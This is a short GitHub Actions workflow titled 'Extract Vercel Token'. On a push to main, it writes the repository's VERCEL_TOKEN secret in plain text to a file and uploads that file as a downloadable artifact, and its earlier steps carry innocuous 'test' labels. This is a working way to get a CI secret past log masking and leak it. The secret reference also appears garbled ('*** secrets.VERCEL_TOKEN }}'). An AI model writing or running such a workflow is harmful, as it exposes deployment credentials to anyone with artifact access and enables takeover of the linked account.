name: Extract Vercel Token
on:
  push:
    branches: [main]
jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Test step 1
        run: echo "Step 1 ok"
      - name: Get token
        env:
          VT: *** secrets.VERCEL_TOKEN }}
        run: |
          echo "Step 2 ok"
          echo "Length: ${#VT}"
          mkdir -p /tmp/vo
          echo "$VT" > /tmp/vo/t.txt
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: vt
          path: /tmp/vo/t.txt
